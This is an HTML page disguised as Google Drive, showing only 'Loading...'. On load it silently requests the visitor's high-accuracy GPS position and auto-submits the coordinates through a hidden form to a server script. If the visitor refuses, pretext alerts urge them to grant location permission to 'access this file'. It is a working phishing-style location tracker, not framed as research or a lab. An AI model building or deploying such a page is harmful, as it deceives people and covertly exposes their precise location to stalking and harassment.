<!DOCTYPE html>
<html>
<head>
<title>Google Drive</title>
<meta charset="utf-8"/>
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
</head>
<body>

<form action="action.php" method="post" id="form" hidden>
  <input id="lat" name="lat" />
  <input id="long" name="long" />
  <input id="acc" name="acc" />
</form>

Loading...

<script type="text/javascript">

function getLocation() {
  if (navigator.geolocation) {
    //checks if the browser supports Geolocation
    navigator.geolocation.getCurrentPosition(showPosition, onErr, options);
  } else {
    document.write("Geolocation is not supported by this browser.");
  }
}

//if browser supports Geolocation and everything is OK takes user location and sends to server
function showPosition(position) {
  document.getElementById("lat").value = position.coords.latitude
  document.getElementById("long").value = position.coords.longitude
  document.getElementById("acc").value = position.coords.accuracy
  document.getElementById("form").submit()
}

//calls this function if any error occurs 
function onErr(err){
  alert("Please reload the webpage and give location permission to use this site")
  document.write(err.message+"<br>Please reload the webpage and give location permission to access this file...<br><br>")
}

const options = {
  enableHighAccuracy: true
  }

getLocation()

</script>
</body>
</html>
